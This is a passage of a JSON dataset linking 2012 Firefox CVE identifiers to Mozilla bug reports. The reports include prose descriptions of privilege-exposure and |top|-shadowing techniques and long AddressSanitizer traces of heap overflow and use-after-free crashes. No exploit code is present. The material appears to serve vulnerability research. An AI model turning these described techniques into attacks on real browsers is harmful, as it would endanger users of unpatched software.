        "description": "When InstallTrigger fails, it throws an error wrapped in a Chrome Object Wrapper. It doesn't specify |__exposedProps__|, so it's unsafe by default. An attacker may append custom-tailored |__exposedProps__| at the bottom of the error's prototype chain (in Object.prototype), thus exposing privileged functions of Object or Function. Function seems to be guarded well (it throws \"Not allowed to access chrome eval or Function from content\"), but Object has things like defineProperty or __defineGetter__, and they can be exploited to pollute the XrayWrapper of the content window."
      }
    ],
    "CVE-2012-3994": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=765527",
        "title": "Object.defineProperty can shadow |top|",
        "description": "Filing a new bug, as requested by Boris in Bug 756719 comment 10. With bug 750307 fixed, the location property itself seems to be hardened well enough, but plugins may try to access it through |top.location| -- for instance, Adobe Flash Player opens javascript:top.location+\"__flashplugin_unique__\" to determine the page origin. And it is possible to shadow |top| using Object.defineProperty. Incidentally, Google Chrome seems to disallow redefining |top|."
      }
    ],
    "CVE-2012-3995": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=765621",
        "title": "Out of bounds read in IsCSSWordSpacingSpace",
        "description": "Reproduces on trunk, run testcase from command line. You also need the empty test.js as in archive. 20120617120215 http://hg.mozilla.org/mozilla-central/rev/b1a0fb2bdbf7 ================================================================= ==27356== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fe2faee2f82 at pc 0x7fe3281b3821 bp 0x7fffdbd009d0 sp 0x7fffdbd009c8 READ of size 1 at 0x7fe2faee2f82 thread T0 #0 0x7fe3281b3821 in nsTextFragment::CharAt(int) const firefox/src/modules/zlib/src/inffast.c:0 #1 0x7fe328cca8a6 in IsCSSWordSpacingSpace(nsTextFragment const*, unsigned int, nsStyleText const*) firefox/src/layout/generic/nsTextFrameThebes.cpp:624 #2 0x7fe328cc811f in PropertyProvider::GetSpacingInternal(unsigned int, unsigned int, gfxFont::Spacing*, bool) firefox/src/layout/generic/nsTextFrameThebes.cpp:2817 #3 0x7fe328cc731d in PropertyProvider::GetSpacing(unsigned int, unsigned int, gfxFont::Spacing*) firefox/src/layout/generic/nsTextFrameThebes.cpp:2776 #4 0x7fe33382d073 in GetAdjustedSpacing(gfxTextRun*, unsigned int, unsigned int, gfxTextRun::PropertyProvider*, gfxFont::Spacing*) firefox/src/gfx/thebes/gfxFont.cpp:4489 #5 0x7fe333838a98 in gfxTextRun::BreakAndMeasureText(unsigned int, unsigned int, bool, double, gfxTextRun::PropertyProvider*, bool, double*, gfxFont::RunMetrics*, gfxFont::BoundingBoxType, gfxContext*, bool*, unsigned int*, bool, gfxBreakPriority*) firefox/src/gfx/thebes/gfxFont.cpp:4866 #6 0x7fe328d43127 in nsTextFrame::ReflowText(nsLineLayout&, int, nsRenderingContext*, bool, nsHTMLReflowMetrics&, unsigned int&) firefox/src/layout/generic/nsTextFrameThebes.cpp:7477 #7 0x7fe328b54e98 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) firefox/src/layout/generic/nsLineLayout.cpp:836 #8 0x7fe328b2586d in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) firefox/src/layout/generic/nsInlineFrame.cpp:680 #9 0x7fe328b21f9d in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) firefox/src/layout/generic/nsInlineFrame.cpp:543 #10 0x7fe328b1f2aa in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsInlineFrame.cpp:397 #11 0x7fe328b54b1f in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) firefox/src/layout/generic/nsLineLayout.cpp:824 #12 0x7fe328810a7f in nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) firefox/src/layout/generic/nsBlockFrame.cpp:3834 #13 0x7fe32880a4da in nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) firefox/src/layout/generic/nsBlockFrame.cpp:3630 #14 0x7fe3287fcf57 in nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/src/layout/generic/nsBlockFrame.cpp:3482 #15 0x7fe3287eb90c in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/src/layout/generic/nsBlockFrame.cpp:2570 #16 0x7fe3287d0d71 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) firefox/src/layout/generic/nsBlockFrame.cpp:2020 #17 0x7fe3287c480f in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsBlockFrame.cpp:1069 #18 0x7fe328854a8b in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) firefox/src/layout/generic/nsBlockReflowContext.cpp:262 #19 0x7fe3287f5d77 in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/src/layout/generic/nsBlockFrame.cpp:3206 #20 0x7fe3287eb466 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/src/layout/generic/nsBlockFrame.cpp:2514 #21 0x7fe3287d0d71 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) firefox/src/layout/generic/nsBlockFrame.cpp:2020 #22 0x7fe3287c480f in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsBlockFrame.cpp:1069 #23 0x7fe3288b4527 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/src/layout/generic/nsContainerFrame.cpp:906 #24 0x7fe3289fe1ae in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) firefox/src/layout/generic/nsGfxScrollFrame.cpp:516 #25 0x7fe328a03a5a in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) firefox/src/layout/generic/nsGfxScrollFrame.cpp:616 #26 0x7fe328a07d7f in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsGfxScrollFrame.cpp:857 #27 0x7fe328b54b1f in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) firefox/src/layout/generic/nsLineLayout.cpp:824 #28 0x7fe328810a7f in nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) firefox/src/layout/generic/nsBlockFrame.cpp:3834 #29 0x7fe32880a4da in nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) firefox/src/layout/generic/nsBlockFrame.cpp:3630 #30 0x7fe3287fcf57 in nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/src/layout/generic/nsBlockFrame.cpp:3482 #31 0x7fe3287eb90c in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/src/layout/generic/nsBlockFrame.cpp:2570 #32 0x7fe3287d0d71 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) firefox/src/layout/generic/nsBlockFrame.cpp:2020 #33 0x7fe3287c480f in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsBlockFrame.cpp:1069 #34 0x7fe328b54b1f in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) firefox/src/layout/generic/nsLineLayout.cpp:824 #35 0x7fe328810a7f in nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) firefox/src/layout/generic/nsBlockFrame.cpp:3834 #36 0x7fe32880af87 in nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) firefox/src/layout/generic/nsBlockFrame.cpp:3665 #37 0x7fe3287fcf57 in nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/src/layout/generic/nsBlockFrame.cpp:3482 #38 0x7fe3287eb90c in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/src/layout/generic/nsBlockFrame.cpp:2570 #39 0x7fe3287d0d71 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) firefox/src/layout/generic/nsBlockFrame.cpp:2020 #40 0x7fe3287c480f in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsBlockFrame.cpp:1069 #41 0x7fe328854a8b in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) firefox/src/layout/generic/nsBlockReflowContext.cpp:262 #42 0x7fe3287f5d77 in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/src/layout/generic/nsBlockFrame.cpp:3206 #43 0x7fe3287eb466 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/src/layout/generic/nsBlockFrame.cpp:2514 #44 0x7fe3287d0d71 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) firefox/src/layout/generic/nsBlockFrame.cpp:2020 #45 0x7fe3287c480f in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsBlockFrame.cpp:1069 #46 0x7fe3288b4527 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/src/layout/generic/nsContainerFrame.cpp:906 #47 0x7fe328a83b57 in nsCanvasFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsCanvasFrame.cpp:429 #48 0x7fe3288b4527 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/src/layout/generic/nsContainerFrame.cpp:906 #49 0x7fe3289fe1ae in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) firefox/src/layout/generic/nsGfxScrollFrame.cpp:516 #50 0x7fe328a03a5a in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) firefox/src/layout/generic/nsGfxScrollFrame.cpp:616 #51 0x7fe328a07d7f in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsGfxScrollFrame.cpp:857 #52 0x7fe3288b4527 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/src/layout/generic/nsContainerFrame.cpp:906 #53 0x7fe328ddbb81 in ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/src/layout/generic/nsViewportFrame.cpp:200 #54 0x7fe32853d016 in PresShell::DoReflow(nsIFrame*, bool) firefox/src/layout/base/nsPresShell.cpp:7382 #55 0x7fe32856aaad in PresShell::ProcessReflowCommands(bool) firefox/src/layout/base/nsPresShell.cpp:7523 #56 0x7fe3285691bd in PresShell::FlushPendingNotifications(mozFlushType) firefox/src/layout/base/nsPresShell.cpp:3852 #57 0x7fe32836ba9f in DocumentViewerImpl::LoadComplete(unsigned int) firefox/src/layout/base/nsDocumentViewer.cpp:982 #58 0x7fe32fbd7a68 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, unsigned int) firefox/src/docshell/base/nsDocShell.cpp:6241 #59 0x7fe32fbcf7a1 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, unsigned int) firefox/src/docshell/base/nsDocShell.cpp:6072 #60 0x7fe32fbd0965 in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, unsigned int) firefox/src/modules/zlib/src/inffast.c:0 #61 0x7fe32fcd5004 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, unsigned int) firefox/src/uriloader/base/nsDocLoader.cpp:1352 #62 0x7fe32fcd2a15 in nsDocLoader::doStopDocumentLoad(nsIRequest*, unsigned int) firefox/src/uriloader/base/nsDocLoader.cpp:930 #63 0x7fe32fccbc68 in nsDocLoader::DocLoaderIsEmpty(bool) firefox/src/uriloader/base/nsDocLoader.cpp:822 0x7fe2faee2f82 is located 0 bytes to the right of 2-byte region [0x7fe2faee2f80,0x7fe2faee2f82) allocated by thread T0 here: #0 0x4a3662 in malloc ??:0 #1 0x7fe33fbcc737 in moz_xmalloc firefox/src/memory/mozalloc/mozalloc.cpp:54 #2 0x7fe333280083 in NS_Alloc_P firefox/src/xpcom/base/nsMemoryImpl.cpp:163 #3 0x7fe326c9b033 in nsMemory::Alloc(unsigned long) firefox/src/../../../dist/include/nsMemory.h:36 #4 0x7fe32a1fd170 in nsTextFragment::Append(unsigned short const*, unsigned int, bool) firefox/src/content/base/src/nsTextFragment.cpp:382 #5 0x7fe329f3deb7 in nsGenericDOMDataNode::SetTextInternal(unsigned int, unsigned int, unsigned short const*, unsigned int, bool, CharacterDataChangeInfo::Details*) firefox/src/content/base/src/nsGenericDOMDataNode.cpp:312 #6 0x7fe329f4ccbc in nsGenericDOMDataNode::AppendText(unsigned short const*, unsigned int, bool) firefox/src/content/base/src/nsGenericDOMDataNode.cpp:858 #7 0x7fe32d0dd860 in nsHtml5TreeOperation::AppendTextToTextNode(unsigned short const*, unsigned int, nsIContent*, nsHtml5TreeOpExecutor*) firefox/src/parser/html/nsHtml5TreeOperation.cpp:140 #8 0x7fe32d0dee80 in nsHtml5TreeOperation::AppendText(unsigned short const*, unsigned int, nsIContent*, nsHtml5TreeOpExecutor*) firefox/src/parser/html/nsHtml5TreeOperation.cpp:155 #9 0x7fe32d0e8c5f in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) firefox/src/parser/html/nsHtml5TreeOperation.cpp:451 #10 0x7fe32d107856 in nsHtml5TreeOpExecutor::RunFlushLoop() firefox/src/parser/html/nsHtml5TreeOpExecutor.cpp:564 #11 0x7fe32d117065 in nsHtml5ExecutorReflusher::Run() firefox/src/parser/html/nsHtml5TreeOpExecutor.cpp:63 #12 0x7fe3331ff2c3 in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:625 #13 0x7fe332e8e8dd in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:217 #14 0x7fe331ff4ee6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #15 0x7fe3334afcda in MessageLoop::RunInternal() firefox/src/ipc/chromium/src/base/message_loop.cc:209 #16 0x7fe3334afb23 in MessageLoop::RunHandler() firefox/src/ipc/chromium/src/base/message_loop.cc:202 #17 0x7fe3334afa08 in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #18 0x7fe33152352e in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #19 0x7fe33016b098 in nsAppStartup::Run() firefox/src/toolkit/components/startup/nsAppStartup.cpp:256 #20 0x7fe326b3ee17 in XREMain::XRE_mainRun() firefox/src/toolkit/xre/nsAppRunner.cpp:3785 #21 0x7fe326b457d2 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/src/toolkit/xre/nsAppRunner.cpp:3862 #22 0x7fe326b48c8b in XRE_main firefox/src/toolkit/xre/nsAppRunner.cpp:3938 ==27356== ABORTING Stats: 154M malloced (167M for red zones) by 355141 calls Stats: 44M realloced by 19866 calls Stats: 114M freed by 225726 calls Stats: 0M really freed by 0 calls Stats: 352M (90162 full pages) mmaped in 88 calls mmaps by size class: 8:278511; 9:57337; 10:20475; 11:18423; 12:3072; 13:2048; 14:1536; 15:384; 16:576; 17:128; 18:160; 19:56; 20:16; mallocs by size class: 8:265584; 9:48356; 10:17023; 11:17025; 12:2568; 13:1904; 14:1480; 15:341; 16:526; 17:112; 18:159; 19:49; 20:14; frees by size class: 8:155781; 9:37742; 10:13552; 11:13792; 12:1632; 13:994; 14:1281; 15:284; 16:456; 17:98; 18:57; 19:46; 20:11; rfrees by size class: Stats: malloc large: 334 small slow: 1873 Shadow byte and word: 0x1ffc5f5dc5f0: 2 0x1ffc5f5dc5f0: 02 fb fb fb fb fb fb fb More shadow bytes: 0x1ffc5f5dc5d0: fd fd fd fd fd fd fd fd 0x1ffc5f5dc5d8: fd fd fd fd fd fd fd fd 0x1ffc5f5dc5e0: fa fa fa fa fa fa fa fa 0x1ffc5f5dc5e8: fa fa fa fa fa fa fa fa =>0x1ffc5f5dc5f0: 02 fb fb fb fb fb fb fb 0x1ffc5f5dc5f8: fb fb fb fb fb fb fb fb 0x1ffc5f5dc600: fa fa fa fa fa fa fa fa 0x1ffc5f5dc608: fa fa fa fa fa fa fa fa 0x1ffc5f5dc610: 00 00 00 00 00 00 00 00"
      }
    ],
    "CVE-2012-4179": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=785574",
        "title": "Heap-use-after-free in nsHTMLCSSUtils::CreateCSSPropertyTxn",
        "description": "Reproduces on trunk ================================================================= ==5528== ERROR: AddressSanitizer heap-use-after-free on address 0x7fdf641dce80 at pc 0x7fdf86465da5 bp 0x7fffd539e810 sp 0x7fffd539e808 READ of size 8 at 0x7fdf641dce80 thread T0 #0 0x7fdf86465da4 in nsHTMLCSSUtils::CreateCSSPropertyTxn(nsIDOMElement*, nsIAtom*, nsAString_internal const&, ChangeCSSInlineStyleTxn**, bool) src/editor/libeditor/html/nsHTMLCSSUtils.cpp:569 #1 0x7fdf86464c29 in nsHTMLCSSUtils::SetCSSProperty(nsIDOMElement*, nsIAtom*, nsAString_internal const&, bool) src/editor/libeditor/html/nsHTMLCSSUtils.cpp:512 #2 0x7fdf86472196 in nsHTMLCSSUtils::SetCSSEquivalentToHTMLStyle(nsIDOMNode*, nsIAtom*, nsAString_internal const*, nsAString_internal const*, int*, bool) src/editor/libeditor/html/nsHTMLCSSUtils.cpp:1012 #3 0x7fdf86514947 in nsHTMLEditor::SetAttributeOrEquivalent(nsIDOMElement*, nsAString_internal const&, nsAString_internal const&, bool) src/editor/libeditor/html/nsHTMLEditor.cpp:4560 #4 0x7fdf8667ae27 in nsHTMLEditRules::AlignBlock(nsIDOMElement*, nsAString_internal const*, bool) src/editor/libeditor/html/nsHTMLEditRules.cpp:8465 #5 0x7fdf865e7340 in nsHTMLEditRules::WillAlign(mozilla::Selection*, nsAString_internal const*, bool*, bool*) src/editor/libeditor/html/nsHTMLEditRules.cpp:4547 #6 0x7fdf865a58c0 in nsHTMLEditRules::WillDoAction(mozilla::Selection*, nsRulesInfo*, bool*, bool*) src/editor/libeditor/html/nsHTMLEditRules.cpp:609 #7 0x7fdf864d22c0 in nsHTMLEditor::Align(nsAString_internal const&) src/editor/libeditor/html/nsHTMLEditor.cpp:2258 #8 0x7fdf864d2a1e in non-virtual thunk to nsHTMLEditor::Align(nsAString_internal const&) src/build/unix/stdc++compat/stdc++compat.cpp:0 #9 0x7fdf89ac6c05 in nsAlignCommand::SetState(nsIEditor*, nsString&) src/editor/composer/src/nsComposerCommands.cpp:971 #10 0x7fdf89ababe4 in nsMultiStateCommand::DoCommandParams(char const*, nsICommandParams*, nsISupports*) src/editor/composer/src/nsComposerCommands.cpp:600 #11 0x7fdf89324c61 in nsControllerCommandTable::DoCommandParams(char const*, nsICommandParams*, nsISupports*) src/embedding/components/commandhandler/src/nsControllerCommandTable.cpp:175 #12 0x7fdf892f7ef2 in nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) src/embedding/components/commandhandler/src/nsBaseCommandController.cpp:153 #13 0x7fdf892f81c6 in non-virtual thunk to nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) src/build/unix/stdc++compat/stdc++compat.cpp:0 #14 0x7fdf8930e81f in nsCommandManager::DoCommand(char const*, nsICommandParams*, nsIDOMWindow*) src/embedding/components/commandhandler/src/nsCommandManager.cpp:234 #15 0x7fdf84891e08 in nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) src/content/html/document/src/nsHTMLDocument.cpp:3232 #16 0x7fdf8489375d in non-virtual thunk to nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) src/build/unix/stdc++compat/stdc++compat.cpp:0 #17 0x7fdf8c8db397 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #18 0x7fdf87ea770e in CallMethodHelper::Invoke() src/js/xpconnect/src/XPCWrappedNative.cpp:3117 #19 0x7fdf87f0a3a5 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1480 #20 0x7fdf93436b91 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:389 #21 0x7fdf933c3ab0 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2413 #22 0x7fdf9332aa35 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:309 #23 0x7fdf93443ea6 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:494 #24 0x7fdf93445e5e in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:531 #25 0x7fdf92ba0d94 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5723 #26 0x7fdf92ba5d31 in JS_EvaluateUCScriptForPrincipalsVersionOrigin src/js/src/jsapi.cpp:5804 #27 0x7fdf8502aadf in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1506 #28 0x7fdf851daf7f in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) src/dom/base/nsGlobalWindow.cpp:9609 #29 0x7fdf851928f9 in nsGlobalWindow::RunTimeout(nsTimeout*) src/dom/base/nsGlobalWindow.cpp:9870 #30 0x7fdf851d8fda in nsGlobalWindow::TimerCallback(nsITimer*, void*) src/dom/base/nsGlobalWindow.cpp:10137 #31 0x7fdf8c81b902 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:473 #32 0x7fdf8c81d1b8 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #33 0x7fdf8c7e05ae in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #34 0x7fdf8c4819c7 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #35 0x7fdf8940c459 in nsXULWindow::ShowModal() src/xpfe/appshell/src/nsXULWindow.cpp:379 #36 0x7fdf893ef880 in nsContentTreeOwner::ShowAsModal() src/xpfe/appshell/src/nsContentTreeOwner.cpp:529 #37 0x7fdf893ef9db in non-virtual thunk to nsContentTreeOwner::ShowAsModal() src/build/unix/stdc++compat/stdc++compat.cpp:0 #38 0x7fdf892220b0 in nsWindowWatcher::OpenWindowInternal(nsIDOMWindow*, char const*, char const*, char const*, bool, bool, bool, nsIArray*, nsIDOMWindow**) src/embedding/components/windowwatcher/src/nsWindowWatcher.cpp:1033 #39 0x7fdf89215fc0 in nsWindowWatcher::OpenWindow(nsIDOMWindow*, char const*, char const*, char const*, nsISupports*, nsIDOMWindow**) src/embedding/components/windowwatcher/src/nsWindowWatcher.cpp:399 #40 0x7fdf8c8db397 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #41 0x7fdf87ea770e in CallMethodHelper::Invoke() src/js/xpconnect/src/XPCWrappedNative.cpp:3117 #42 0x7fdf87f0a3a5 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1480 #43 0x7fdf93436b91 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:389 #44 0x7fdf933c3ab0 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2413 #45 0x7fdf9332aa35 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:309 #46 0x7fdf93437205 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:363 #47 0x7fdf92cd1ffc in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:119 #48 0x7fdf9343c54b in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:396 #49 0x7fdf92badd7b in JS_CallFunctionValue src/js/src/jsapi.cpp:5904 #50 0x7fdf87e563a2 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJSClass.cpp:1436 #51 0x7fdf87dfad06 in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) src/js/xpconnect/src/XPCWrappedJS.cpp:580 #52 0x7fdf8c8e0e56 in PrepareAndDispatch src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 #53 0x7fdf8c8de126 in SharedStub src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 #54 0x7fdf8c8db397 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #55 0x7fdf87ea770e in CallMethodHelper::Invoke() src/js/xpconnect/src/XPCWrappedNative.cpp:3117 #56 0x7fdf87f0a3a5 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1480 #57 0x7fdf93436b91 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:389 #58 0x7fdf933c3ab0 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2413 #59 0x7fdf9332aa35 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:309 #60 0x7fdf93437205 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:363 #61 0x7fdf92cd1ffc in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:119 #62 0x7fdf930e0690 in js::CallOrConstructBoundFunction(JSContext*, unsigned int, JS::Value*) src/js/src/jsfun.cpp:1029 #63 0x7fdf93436b92 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:389 0x7fdf641dce80 is located 0 bytes inside of 16-byte region [0x7fdf641dce80,0x7fdf641dce90) freed by thread T0 here: #0 0x4c3d80 in free ??:0 #1 0x7fdf99a75572 in moz_free src/memory/mozalloc/mozalloc.cpp:51 #2 0x7fdf86539480 in operator delete(void*) src/../../../dist/include/mozilla/mozalloc.h:224 #3 0x7fdf86491dc7 in nsAutoPtr<nsHTMLCSSUtils>::operator=(nsHTMLCSSUtils*) src/../../../dist/include/nsAutoPtr.h:101 #4 0x7fdf8649058c in nsHTMLEditor::Init(nsIDOMDocument*, nsIContent*, nsISelectionController*, unsigned int) src/editor/libeditor/html/nsHTMLEditor.cpp:249 #5 0x7fdf89b04aae in nsEditingSession::SetupEditorOnWindow(nsIDOMWindow*) src/editor/composer/src/nsEditingSession.cpp:460 #6 0x7fdf89afa507 in nsEditingSession::MakeWindowEditable(nsIDOMWindow*, 